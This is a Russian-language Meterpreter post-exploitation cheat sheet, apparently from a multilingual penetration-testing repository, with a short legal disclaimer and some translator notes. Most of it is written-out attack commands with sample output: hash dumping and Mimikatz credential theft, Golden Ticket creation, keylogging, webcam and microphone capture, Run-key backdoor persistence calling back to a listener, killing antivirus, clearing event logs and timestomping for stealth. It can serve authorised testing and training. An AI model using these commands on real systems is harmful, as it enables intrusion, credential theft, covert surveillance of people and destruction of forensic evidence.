<a id="-meterpreter---complete-cheatsheet"></a>
# 🎭 Meterpreter — полная шпаргалка

<!-- language-home-navigation -->
[🏠 Русская главная страница](../../README.ru.md) • [🌐 Languages](../../README.md#-available-languages)
[🇬🇧 English](../Meterpreter.md) • [🇷🇺 Русский раздел](../../README.ru.md)


[🇹🇷 Türkçe Sürüm](Meterpreter.tr.md) • [🇬🇷 Ελληνικά](Meterpreter.el.md)

```
    ███╗   ███╗███████╗████████╗███████╗██████╗ ██████╗ ██████╗ ███████╗████████╗███████╗██████╗ 
    ████╗ ████║██╔════╝╚══██╔══╝██╔════╝██╔══██╗██╔══██╗██╔══██╗██╔════╝╚══██╔══╝██╔════╝██╔══██╗
    ██╔████╔██║█████╗     ██║   █████╗  ██████╔╝██████╔╝██████╔╝█████╗     ██║   █████╗  ██████╔╝
    ██║╚██╔╝██║██╔══╝     ██║   ██╔══╝  ██╔══██╗██╔═══╝ ██╔══██╗██╔══╝     ██║   ██╔══╝  ██╔══██╗
    ██║ ╚═╝ ██║███████╗   ██║   ███████╗██║  ██║██║     ██║  ██║███████╗   ██║   ███████╗██║  ██║
    ╚═╝     ╚═╝╚══════╝   ╚═╝   ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝  ╚═╝╚══════╝   ╚═╝   ╚══════╝╚═╝  ╚═╝
```

![Meterpreter](https://img.shields.io/badge/Meterpreter-Session-purple?style=for-the-badge)
![Post Exploitation](https://img.shields.io/badge/Post-Exploitation-orange?style=for-the-badge)
![Metasploit](https://img.shields.io/badge/Metasploit-Framework-blue?style=for-the-badge)
![Windows](https://img.shields.io/badge/Windows-Linux-green?style=for-the-badge)

> **Многофункциональный инструмент для действий после получения доступа** — набор возможностей для дальнейшего исследования системы

---

<a id="-table-of-contents"></a>
## 📋 Содержание

- [Что такое Meterpreter?](#-what-is-meterpreter)
- [Базовые команды](#-core-commands)
- [Сведения о системе](#-system-information)
- [Работа с файловой системой](#-file-system-commands)
- [Сетевые команды](#-network-commands)
- [Работа с процессами](#-process-commands)
- [Пользователи и привилегии](#-user--privilege-commands)
- [Сбор паролей и учётных данных](#-password-harvesting)
- [Перехват нажатий клавиш](#-keylogging)
- [Снимки экрана и веб-камера](#-screenshot--webcam)
- [Закрепление доступа](#-persistence)
- [Pivoting и перенаправление портов](#-pivoting--port-forwarding)
- [Противодействие криминалистическому анализу](#-anti-forensics)
- [Скрипты и автоматизация](#-scripting--automation)
- [Справочная таблица](#-quick-reference-table)
- [Советы и приёмы](#-tips--tricks)

---

<a id="-what-is-meterpreter"></a>
## 🎯 Что такое Meterpreter?

> **Уточнение к описанию:** внедрение DLL относится к определённым реализациям Meterpreter, а не ко всем перечисленным платформам. Существуют [staged и stageless варианты](https://docs.metasploit.com/docs/using-metasploit/advanced/meterpreter/meterpreter-stageless-mode.html) и разные [транспорты](https://docs.metasploit.com/docs/using-metasploit/advanced/meterpreter/meterpreter-transport-control.html). Формулировка таблицы о TLS не является универсальным свойством всех транспортов; в частности, [HTTP и HTTPS различаются](https://docs.metasploit.com/docs/using-metasploit/advanced/meterpreter/meterpreter-http-communication.html). Выполнение в памяти не означает отсутствия журналов, сетевых событий и других следов.

**Meterpreter** (Meta-Interpreter) — динамически расширяемая полезная нагрузка. В оригинале её работа описана через внедрение DLL в память и обмен данными через сокет stager; применимость этого описания зависит от реализации и транспорта (см. уточнение ниже).

<a id="key-features"></a>
### Основные возможности

| Возможность | Описание |
|---------|-------------|
| **Выполнение в памяти** | Выполняется в оперативной памяти, оставляя минимум следов |
| **Зашифрованный обмен данными** | Канал к серверу управления (C2), зашифрованный с помощью TLS |
| **Расширяемость** | Загрузка расширений во время работы |
| **Поддержка нескольких платформ** | Windows, Linux, macOS, Android, PHP, Java |
| **Возможность pivoting** | Маршрутизация трафика через скомпрометированные узлы |

<a id="meterpreter-types"></a>
### Варианты Meterpreter

```bash
# Windows
windows/meterpreter/reverse_tcp
windows/x64/meterpreter/reverse_tcp
windows/meterpreter/reverse_https

# Linux
linux/x86/meterpreter/reverse_tcp
linux/x64/meterpreter/reverse_tcp

# macOS
osx/x64/meterpreter/reverse_tcp

# Android
android/meterpreter/reverse_tcp

# PHP
php/meterpreter/reverse_tcp

# Java
java/meterpreter/reverse_tcp

# Python
python/meterpreter/reverse_tcp
```

---

<a id="-core-commands"></a>
## ⌨️ Базовые команды

<a id="help--navigation"></a>
### Справка и навигация

```bash
# Показать все команды
meterpreter > help

# Получить справку по определённой команде
meterpreter > help upload

# Показать сведения о каналах
meterpreter > channel -l
```

<a id="session-management"></a>
### Управление сеансами

> **Исправление подписи оригинала:** exit и quit завершают сеанс Meterpreter; background и bg оставляют его работающим в фоне и возвращают управление консоли. См. [официальный обработчик команд](https://github.com/rapid7/metasploit-framework/blob/master/lib/rex/post/meterpreter/ui/console/command_dispatcher/core.rb). Команды ниже не изменены.

```bash
# Получить сведения о сеансе
meterpreter > info

# Перевести текущий сеанс в фоновый режим
meterpreter > background
meterpreter > bg

# Вернуться в msfconsole (подпись оригинала; см. уточнение)
meterpreter > exit

# Полностью завершить сеанс
meterpreter > quit

# Переподключиться при обрыве соединения
meterpreter > transport list
meterpreter > transport add -t reverse_tcp -l <LHOST> -p <LPORT>
```

<a id="channel-operations"></a>
### Работа с каналами

```bash
# Перечислить активные каналы
meterpreter > channel -l

# Перейти к работе с каналом
meterpreter > channel -i <id>

# Прочитать данные из канала
meterpreter > channel -r <id>

# Записать данные в канал
meterpreter > channel -w <id>

# Закрыть канал
meterpreter > channel -c <id>
```

---

<a id="-system-information"></a>
## 💻 Сведения о системе

<a id="basic-system-info"></a>
### Основные сведения о системе

```bash
# Получить сведения о системе
meterpreter > sysinfo
Computer        : WIN-PC
OS              : Windows 10 (10.0 Build 19041)
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x64/windows

# Узнать текущего пользователя
meterpreter > getuid
Server username: WIN-PC\Administrator

# Узнать идентификатор текущего процесса
meterpreter > getpid
Current pid: 1234

# Узнать имя процесса
meterpreter > getpname

# Проверить, выполняется ли система в виртуальной машине
meterpreter > run post/windows/gather/checkvm
```

<a id="environment--registry"></a>
### Переменные окружения и реестр

```bash
# Посмотреть переменные окружения
meterpreter > getenv PATH
meterpreter > getenv USERNAME

# Задать переменную окружения
meterpreter > setenv VAR value

# Операции с реестром Windows
meterpreter > reg enumkey -k HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run
meterpreter > reg queryval -k HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run -v SecurityHealth
meterpreter > reg setval -k HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run -v Backdoor -d "C:\\backdoor.exe"
meterpreter > reg deleteval -k HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run -v Backdoor
```

<a id="installed-software--patches"></a>
### Установленные программы и исправления

```bash
# Перечислить установленные приложения
meterpreter > run post/windows/gather/enum_applications

# Перечислить установленные исправления
meterpreter > run post/windows/gather/enum_patches

# Проверить пути служб без кавычек
meterpreter > run post/windows/gather/enum_unquoted_service_paths
```

---

<a id="-file-system-commands"></a>
## 📁 Работа с файловой системой

<a id="navigation"></a>
### Навигация

```bash
# Показать текущий каталог
meterpreter > pwd
C:\Users\Administrator\Desktop

# Просмотреть содержимое каталога
meterpreter > ls
meterpreter > ls -la

# Сменить каталог
meterpreter > cd C:\\Users
meterpreter > cd ..

# Показать текущий локальный каталог
meterpreter > lpwd

# Сменить локальный каталог
meterpreter > lcd /tmp

# Просмотреть локальный каталог
meterpreter > lls
```

<a id="file-operations"></a>
### Операции с файлами

```bash
# Прочитать содержимое файла
meterpreter > cat C:\\Users\\Administrator\\Desktop\\secret.txt

# Изменить файл
meterpreter > edit C:\\file.txt

# Удалить файл
meterpreter > rm C:\\temp\\malware.exe

# Создать каталог
meterpreter > mkdir C:\\temp\\hidden

# Удалить каталог
meterpreter > rmdir C:\\temp\\hidden

# Скопировать файл
meterpreter > cp source.txt destination.txt

# Переместить или переименовать файл
meterpreter > mv oldname.txt newname.txt
```

<a id="file-transfer"></a>
### Передача файлов

```bash
# Скачать файл с целевого узла
meterpreter > download C:\\Users\\Administrator\\Desktop\\passwords.txt
meterpreter > download C:\\Users\\Administrator\\Desktop\\passwords.txt /tmp/

# Скачать каталог рекурсивно
meterpreter > download -r C:\\Users\\Administrator\\Documents

# Загрузить файл на целевой узел
meterpreter > upload /tmp/backdoor.exe C:\\Windows\\Temp\\
meterpreter > upload -r /local/directory C:\\remote\\directory

# Показать ход передачи файла
meterpreter > download -p C:\\large_file.zip
```

<a id="file-search"></a>
### Поиск файлов

```bash
# Найти файлы
meterpreter > search -f *.txt
meterpreter > search -f password* -d C:\\Users
meterpreter > search -f *.docx -d C:\\

# Найти файлы с определённым расширением на всех дисках
meterpreter > search -f *.kdbx

# Поиск по шаблону имени файла
meterpreter > search -f *password* -r
```

<a id="file-hashing--timestamps"></a>
### Хеши файлов и временные метки

```bash
# Получить контрольную сумму файла
meterpreter > checksum md5 C:\\Windows\\System32\\cmd.exe
meterpreter > checksum sha1 C:\\Windows\\System32\\cmd.exe
meterpreter > checksum sha256 C:\\file.exe

# Изменить временные метки (timestomp)
meterpreter > timestomp C:\\backdoor.exe -f C:\\Windows\\System32\\cmd.exe
meterpreter > timestomp C:\\backdoor.exe -z "01/01/2020 00:00:00"
meterpreter > timestomp C:\\backdoor.exe -m "01/01/2020 00:00:00"
meterpreter > timestomp C:\\backdoor.exe -a "01/01/2020 00:00:00"
meterpreter > timestomp C:\\backdoor.exe -c "01/01/2020 00:00:00"
```

---

<a id="-network-commands"></a>
## 🌐 Сетевые команды

<a id="network-information"></a>
### Сведения о сети

```bash
# Получить сведения о сетевых интерфейсах
meterpreter > ipconfig
meterpreter > ifconfig

# Получить таблицу маршрутизации
meterpreter > route

# Получить кеш ARP
meterpreter > arp

# Получить активные сетевые соединения
meterpreter > netstat
```

<a id="port-forwarding"></a>
### Перенаправление портов

```bash
# Перенаправить локальный порт на удалённый узел
meterpreter > portfwd add -l 8080 -p 80 -r 192.168.1.100

# Перечислить перенаправления портов
meterpreter > portfwd list

# Удалить перенаправление порта
meterpreter > portfwd delete -l 8080 -p 80 -r 192.168.1.100

# Удалить все перенаправления портов
meterpreter > portfwd flush

# Пример: перенаправление RDP
meterpreter > portfwd add -l 3389 -p 3389 -r 10.10.10.5
# Теперь подключиться: rdesktop 127.0.0.1:3389
```

<a id="dns--network-utilities"></a>
### DNS и сетевые утилиты

```bash
# Разрешить имя узла
meterpreter > resolve google.com

# Получить настройки прокси
meterpreter > run post/windows/gather/enum_proxy
```

---

<a id="-process-commands"></a>
## ⚙️ Работа с процессами

<a id="process-listing"></a>
### Просмотр процессов

```bash
# Перечислить все процессы
meterpreter > ps

# Отфильтровать процессы
meterpreter > pgrep explorer.exe
meterpreter > pgrep -u Administrator

# Получить сведения о текущем процессе
meterpreter > getpid
```

<a id="process-manipulation"></a>
### Управление процессами

```bash
# Перейти в другой процесс
meterpreter > migrate <PID>
meterpreter > migrate -N explorer.exe

# Завершить процесс
meterpreter > kill <PID>

# Выполнить команду и получить вывод
meterpreter > execute -f cmd.exe -a "/c whoami" -i -H

# Выполнить в фоновом режиме
meterpreter > execute -f notepad.exe -H

# Выполнить с вводом-выводом через канал
meterpreter > execute -f cmd.exe -c -i
```

<a id="process-migration-tips"></a>
### Советы по миграции между процессами

> **Уточнение:** слово «безопасные» в исходном списке не гарантирует безопасную миграцию. Возможность и последствия зависят от архитектуры, прав и защиты процесса. Упоминание lsass.exe как обязательного для hashdump — чрезмерное обобщение; не считайте перенос в этот процесс необходимым условием каждого сценария выгрузки SAM.

```bash
# В оригинале рекомендуются следующие процессы для миграции в Windows
# - explorer.exe (контекст пользователя, стабильный процесс)
# - svchost.exe (SYSTEM, несколько экземпляров)
# - lsass.exe (SYSTEM; в оригинале указан как необходимый для hashdump)

# Найти explorer.exe и перейти в него
meterpreter > ps | grep explorer
meterpreter > migrate <explorer_pid>

# Автоматически перейти в стабильный процесс
meterpreter > run post/windows/manage/migrate
```

---

<a id="-user--privilege-commands"></a>
## 👤 Пользователи и привилегии

<a id="current-user-info"></a>
### Сведения о текущем пользователе

> **Уточнение:** getsystem не является пассивной проверкой повышения: команда пытается получить привилегии SYSTEM. Примеры требуют подходящего контекста и не гарантируют успеха.

```bash
# Узнать текущего пользователя
meterpreter > getuid
Server username: WIN-PC\Administrator

# Получить текущие привилегии
meterpreter > getprivs

# Проверить повышение привилегий в Windows (команда ниже также пытается повысить их)
meterpreter > getsystem
...got system via technique 1 (Named Pipe Impersonation)
```

<a id="privilege-escalation"></a>
### Повышение привилегий

```bash
# Попытаться получить привилегии SYSTEM
meterpreter > getsystem
meterpreter > getsystem -t 1  # Олицетворение через именованный канал (в памяти, нужны права администратора)
meterpreter > getsystem -t 2  # Олицетворение через именованный канал (с записью файла, нужны права администратора)
meterpreter > getsystem -t 3  # Дублирование токена (в памяти, нужны права администратора)

# Обход UAC из msfconsole
msf6 > use exploit/windows/local/bypassuac_eventvwr
msf6 > set SESSION 1
msf6 > exploit

# Подбор локальных эксплойтов
meterpreter > run post/multi/recon/local_exploit_suggester

# Заимствовать токен другого процесса
meterpreter > steal_token <PID>

# Отказаться от заимствованного токена
meterpreter > drop_token

# Олицетворить пользователя
meterpreter > impersonate_token "DOMAIN\\Administrator"

# Перечислить доступные токены
meterpreter > use incognito
meterpreter > list_tokens -u
```

<a id="user-enumeration"></a>
### Сбор сведений о пользователях

```bash
# Перечислить локальных пользователей
meterpreter > run post/windows/gather/enum_logged_on_users

# Перечислить пользователей домена, если узел входит в домен
meterpreter > run post/windows/gather/enum_domain_users

# Перечислить локальные группы
meterpreter > run post/windows/gather/local_admin_search_enum
```

---

<a id="-password-harvesting"></a>
## 🔐 Сбор паролей и учётных данных

<a id="hash-dumping"></a>
### Выгрузка хешей

```bash
# Выгрузить хеши паролей (требуются соответствующие привилегии, обычно SYSTEM)
meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
user:1001:aad3b435b51404eeaad3b435b51404ee:e19ccf75ee54e06b06a5907af13cef42:::

# Если hashdump не сработал, попробовать
meterpreter > run post/windows/gather/smart_hashdump
```

<a id="mimikatz--kiwi-extension"></a>
### Расширение Mimikatz / Kiwi

```bash
# Загрузить Kiwi (Mimikatz)
meterpreter > load kiwi

# Получить все доступные учётные данные
meterpreter > creds_all

# Получить пароль из памяти
meterpreter > kiwi_cmd sekurlsa::logonpasswords

# Выгрузить билеты Kerberos
meterpreter > kiwi_cmd sekurlsa::tickets

# Получить пароли Wi-Fi
meterpreter > kiwi_cmd misc::wifi

# Выгрузка данных LSA
meterpreter > lsa_dump_sam
meterpreter > lsa_dump_secrets

# Создание Golden Ticket
meterpreter > golden_ticket_create -d domain.local -k <krbtgt_hash> -s <domain_sid> -u Administrator -t /tmp/golden.kirbi
```

<a id="credential-collection"></a>
### Сбор учётных данных

```bash
# Найти учётные данные в файлах
meterpreter > run post/multi/gather/credentials/generic

# Учётные данные браузеров
meterpreter > run post/multi/gather/firefox_creds
meterpreter > run post/windows/gather/enum_chrome

# Ключи SSH
meterpreter > run post/multi/gather/ssh_creds

# Диспетчер учётных данных Windows
meterpreter > run post/windows/gather/enum_cred_store

# Учётные данные Outlook
meterpreter > run post/windows/gather/credentials/outlook
```

---

<a id="-keylogging"></a>
## ⌨️ Перехват нажатий клавиш

<a id="startstop-keylogger"></a>
### Запуск и остановка перехватчика клавиш

```bash
# Запустить перехватчик клавиш
meterpreter > keyscan_start
Starting the keystroke sniffer...

# Показать перехваченные нажатия клавиш
meterpreter > keyscan_dump
Dumping captured keystrokes...
username: admin
password: secretpass123

# Остановить перехватчик клавиш
meterpreter > keyscan_stop
Stopping the keystroke sniffer...
```

<a id="advanced-keylogging"></a>
### Дополнительные способы перехвата клавиш

```bash
# Запустить перехватчик клавиш отдельным процессом
meterpreter > run post/windows/capture/keylog_recorder

# Перейти в процесс с доступом к клавиатуре (explorer.exe)
meterpreter > migrate -N explorer.exe
meterpreter > keyscan_start
```

---

<a id="-screenshot--webcam"></a>
## 📸 Снимки экрана и веб-камера

<a id="screenshots"></a>
### Снимки экрана

```bash
# Сделать один снимок экрана
meterpreter > screenshot
Screenshot saved to: /root/screenshot.jpeg

# Сохранить снимок экрана по заданному пути
meterpreter > screenshot -p /tmp/screen.jpg

# Периодически делать снимки экрана
meterpreter > run post/multi/gather/screen_spy

# Просматривать рабочий стол в реальном времени
meterpreter > screenshare
```

<a id="webcam-operations"></a>
### Работа с веб-камерой

```bash
# Перечислить веб-камеры
meterpreter > webcam_list
1: Integrated Webcam

# Сделать снимок с веб-камеры
meterpreter > webcam_snap
[*] Starting...
[+] Got frame
[*] Stopped
Webcam shot saved to: /root/webcam.jpeg

# Сделать снимок с указанными параметрами
meterpreter > webcam_snap -i 1 -p /tmp/webcam.jpg

# Передавать видео с веб-камеры в реальном времени
meterpreter > webcam_stream
```

<a id="audio-recording"></a>
### Запись звука

```bash
# Записать звук с микрофона
meterpreter > record_mic -d 30
[*] Starting...
[*] Stopped
Audio saved to: /root/audio.wav

# Записать звук заданной длительности
meterpreter > record_mic -d 60 -f /tmp/recording.wav
```

---

<a id="-persistence"></a>
## 🔄 Закрепление доступа

> **Совместимость:** старые примеры run persistence, metsvc, scraper, winenum и другие имена скриптов оставлены из оригинала. Их наличие и набор параметров зависят от версии, платформы и расширений; используйте встроенную справку выбранной версии и [официальную документацию](https://docs.metasploit.com/docs/using-metasploit/advanced/meterpreter/meterpreter.html).

<a id="windows-persistence"></a>
### Закрепление доступа в Windows

```bash
# Закрепление через реестр
meterpreter > run persistence -X -i 10 -p 4444 -r 192.168.1.50

# Закрепление через планировщик заданий
meterpreter > run post/windows/manage/persistence_exe

# Закрепление через службу
meterpreter > run metsvc

# Закрепление через WMI
meterpreter > run post/windows/manage/wmi_persistence
```

<a id="persistence-options-explained"></a>
### Описание параметров закрепления

```bash
# Параметры скрипта persistence
-A        # Автоматически запустить соответствующий обработчик
-L <path> # Путь для записи полезной нагрузки
-P <path> # Используемая полезная нагрузка
-S        # Запустить как службу с правами SYSTEM
-T        # Альтернативный шаблон EXE
-U        # Запускать при входе пользователя
-X        # Запускать при загрузке системы
-i <sec>  # Интервал между попытками подключения
-p <port> # Порт, к которому подключается полезная нагрузка
-r <ip>   # IP-адрес, к которому подключается полезная нагрузка
```

<a id="remove-persistence"></a>
### Удаление механизмов закрепления

```bash
# Перечислить механизмы закрепления
meterpreter > run post/windows/gather/enum_persistence

# Удалить механизм закрепления вручную
meterpreter > reg deleteval -k HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run -v Backdoor
```

---

<a id="-pivoting--port-forwarding"></a>
## 🔀 Pivoting и перенаправление портов

<a id="route-management"></a>
### Управление маршрутами

```bash
# Добавить маршрут через сеанс
meterpreter > run autoroute -s 10.10.10.0/24

# Просмотреть маршруты
meterpreter > run autoroute -p

# Удалить маршрут
meterpreter > run autoroute -d -s 10.10.10.0/24

# Из msfconsole
msf6 > route add 10.10.10.0 255.255.255.0 1
msf6 > route print
```

<a id="socks-proxy"></a>
### Прокси SOCKS

```bash
# Запустить прокси SOCKS из msfconsole
msf6 > use auxiliary/server/socks_proxy
msf6 > set SRVPORT 1080
msf6 > set VERSION 4a
msf6 > run -j

# Настроить proxychains
# Изменить /etc/proxychains.conf:
# socks4 127.0.0.1 1080

# Использование через proxychains
proxychains nmap -sT -Pn 10.10.10.0/24
proxychains ssh user@10.10.10.5
```

<a id="port-forwarding-examples"></a>
### Примеры перенаправления портов

```bash
# Перенаправить локальный порт на внутренний узел
meterpreter > portfwd add -l 445 -p 445 -r 10.10.10.5

# Обратное перенаправление порта
meterpreter > portfwd add -R -l 8080 -p 80 -L 192.168.1.50

# Примеры сценариев:
# Доступ к внутреннему веб-серверу
meterpreter > portfwd add -l 8080 -p 80 -r 10.10.10.100

# Доступ к внутреннему RDP
meterpreter > portfwd add -l 33389 -p 3389 -r 10.10.10.5

# Доступ к внутреннему SMB
meterpreter > portfwd add -l 1445 -p 445 -r 10.10.10.5
```

---

<a id="-anti-forensics"></a>
## 🧹 Противодействие криминалистическому анализу

<a id="clear-evidence"></a>
### Очистка следов

```bash
# Очистить журналы событий Windows
meterpreter > clearev
[*] Wiping 1234 records from Application...
[*] Wiping 5678 records from System...
[*] Wiping 9012 records from Security...

# Изменить временные метки файлов
meterpreter > timestomp C:\\backdoor.exe -f C:\\Windows\\System32\\calc.exe
```

<a id="evasion-techniques"></a>
### Методы обхода обнаружения

```bash
# Перейти в легитимный процесс
meterpreter > migrate -N svchost.exe

# Проверить наличие средств наблюдения
meterpreter > run post/windows/gather/enum_av

# Отключить антивирус (рискованно)
meterpreter > run post/windows/manage/killav

# Скрыть процесс
meterpreter > run post/windows/manage/inject_host
```

---

<a id="-scripting--automation"></a>
## 📜 Скрипты и автоматизация

<a id="resource-scripts"></a>
### Ресурсные скрипты

```bash
# Создать ресурсный скрипт
echo "sysinfo
getuid
hashdump
run post/windows/gather/enum_logged_on_users" > post_exploit.rc

# Выполнить ресурсный скрипт
meterpreter > resource post_exploit.rc
```

<a id="common-scripts"></a>
### Типовые скрипты

```bash
# Сбор сведений о системе
meterpreter > run scraper

# Собрать все доступные сведения
meterpreter > run winenum

# Проверить наличие виртуальной машины
meterpreter > run checkvm

# Найти локальные подсети для pivoting
meterpreter > run get_local_subnets

# Разведка на разных платформах
meterpreter > run post/multi/recon/local_exploit_suggester
```

<a id="irb-shell-ruby"></a>
### Оболочка IRB (Ruby)

```bash
# Войти в режим IRB
meterpreter > irb

# Пример: перечислить файлы
>> client.fs.dir.entries("C:\\")

# Пример: прочитать файл
>> client.fs.file.open("C:\\secret.txt").read

# Выйти из IRB
>> exit
```

---

<a id="-quick-reference-table"></a>
## 📊 Справочная таблица

<a id="essential-commands"></a>
### Основные команды

| Команда | Описание |
|---------|-------------|
| `sysinfo` | Сведения о системе |
| `getuid` | Текущий пользователь |
| `getpid` | Идентификатор текущего процесса |
| `ps` | Перечислить процессы |
| `migrate <PID>` | Перейти в другой процесс |
| `getsystem` | Повысить привилегии до SYSTEM |
| `hashdump` | Выгрузить хеши паролей |
| `shell` | Открыть системную командную оболочку |
| `upload <src> <dst>` | Загрузить файл на удалённый узел |
| `download <src>` | Скачать файл |
| `screenshot` | Сделать снимок экрана |
| `webcam_snap` | Снимок с веб-камеры |
| `keyscan_start` | Запустить перехватчик клавиш |
| `keyscan_dump` | Получить перехваченные нажатия |

<a id="file-operations-1"></a>
### Операции с файлами

| Команда | Описание |
|---------|-------------|
| `pwd` | Показать текущий каталог |
| `cd <dir>` | Сменить каталог |
| `ls` | Перечислить файлы |
| `cat <file>` | Прочитать файл |
| `edit <file>` | Изменить файл |
| `rm <file>` | Удалить файл |
| `mkdir <dir>` | Создать каталог |
| `search -f <pattern>` | Найти файлы |

<a id="network-operations"></a>
### Сетевые операции

| Команда | Описание |
|---------|-------------|
| `ipconfig` | Сетевые интерфейсы |
| `route` | Таблица маршрутизации |
| `netstat` | Активные соединения |
| `portfwd add -l <lport> -p <rport> -r <rhost>` | Перенаправить порт |
| `run autoroute -s <subnet>` | Добавить маршрут для доступа через промежуточный узел |

<a id="privilege-escalation-1"></a>
### Повышение привилегий

| Команда | Описание |
|---------|-------------|
| `getsystem` | Получить привилегии SYSTEM |
| `getprivs` | Перечислить текущие привилегии |
| `steal_token <PID>` | Заимствовать токен процесса |
| `load incognito` | Загрузить расширение incognito |
| `list_tokens -u` | Перечислить доступные токены |
| `impersonate_token` | Олицетворить пользователя с помощью токена |

<a id="credential-harvesting"></a>
### Сбор учётных данных

| Команда | Описание |
|---------|-------------|
| `hashdump` | Выгрузить хеши из SAM |
| `load kiwi` | Загрузить Mimikatz |
| `creds_all` | Все учётные данные |
| `lsa_dump_sam` | Выгрузка SAM через LSA |
| `kiwi_cmd <cmd>` | Выполнить команду Mimikatz |

---

<a id="-tips--tricks"></a>
## 💡 Советы и приёмы

<a id="best-practices"></a>
### Рекомендуемые практики

1. **Сначала перейти в другой процесс**
   ```bash
   # До дальнейших действий перейти в стабильный процесс
   meterpreter > migrate -N explorer.exe
   ```

2. **Переводить сеансы в фон**
   ```bash
   # Переводить сеансы в фон вместо их закрытия
   meterpreter > background
   ```

3. **Использовать зашифрованные соединения**
   ```bash
   # Предпочитать полезные нагрузки с HTTPS
   windows/meterpreter/reverse_https
   ```

4. **Проверять перед выполнением действий**
   ```bash
   # Всегда проверять привилегии
   meterpreter > getuid
   meterpreter > getprivs
   ```

<a id="troubleshooting"></a>
### Устранение неполадок

| Проблема | Решение |
|-------|----------|
| Сеанс завершается | Перейти в стабильный процесс |
| Команда hashdump завершается ошибкой | Сначала получить SYSTEM командой `getsystem` |
| Команда getsystem завершается ошибкой | Попробовать другой метод `-t 1,2,3` |
| Перехватчик клавиш не возвращает данных | Перейти в процесс explorer.exe |
| Превышено время ожидания команд | Проверить сетевое соединение |

<a id="stealth-tips"></a>
### Советы по скрытности

```bash
# 1. Перейти из исходного процесса
meterpreter > migrate -N svchost.exe

# 2. Очистить следы
meterpreter > clearev

# 3. Изменить временные метки загруженных файлов
meterpreter > timestomp C:\\file.exe -f C:\\Windows\\System32\\calc.exe

# 4. После завершения удалить записанные файлы
meterpreter > rm C:\\temp\\payload.exe
```

---

<a id="-legal-disclaimer"></a>
## ⚠️ Правовое уведомление

> **ПРЕДУПРЕЖДЕНИЕ:** шпаргалка предназначена только для обучения и разрешённого тестирования на проникновение. Несанкционированный доступ к компьютерным системам незаконен. Всегда получайте разрешение до начала проверки.

---

<a id="-related-resources"></a>
## 📚 Связанные материалы

- [Metasploit Framework Guide](./README.ru.md)
- [Offensive Security Documentation](https://www.offensive-security.com/)
- [Rapid7 Metasploit Documentation](https://docs.metasploit.com/)

---

<p align="center">
  <b>🎭 Освойте действия после получения доступа!</b><br>
  <i>Meterpreter открывает возможности дальнейшего исследования после первоначального доступа</i>
</p>
